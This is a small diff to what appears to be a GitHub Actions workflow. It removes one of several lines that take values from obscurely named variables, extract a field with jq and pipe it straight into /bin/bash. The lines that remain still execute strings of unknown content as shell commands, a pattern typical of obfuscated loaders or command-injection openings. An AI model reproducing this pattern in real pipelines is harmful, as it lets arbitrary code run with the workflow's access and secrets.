@@ -36,7 +36,6 @@ jobs:
           echo $wpfta7237 | jq -r .zclc2820 | /bin/bash
           printf '%s' "$we3238" | jq -r .uvkdk043 | /bin/bash
           printf '%s' "$bo29" | jq -r .x834 | /bin/bash
-          printf '%s' "$nf8" | jq -r .oamim00981 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
